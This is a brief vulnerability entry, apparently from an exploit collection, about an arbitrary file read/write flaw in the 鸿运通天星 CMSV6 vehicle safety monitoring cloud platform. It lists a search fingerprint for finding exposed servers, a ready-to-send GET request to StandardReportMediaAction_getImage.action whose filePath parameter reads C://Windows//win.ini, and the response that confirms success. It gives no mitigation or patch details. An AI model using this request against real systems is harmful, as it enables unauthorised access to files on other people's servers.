# 鸿运通天星CMSV6车载主动安全监控云平台任意文件读取漏洞

鸿运通天星CMSV6车载主动安全监控云平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="./open/webApi.html"`
- **请求**：`GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1`
- **响应特征**：200 support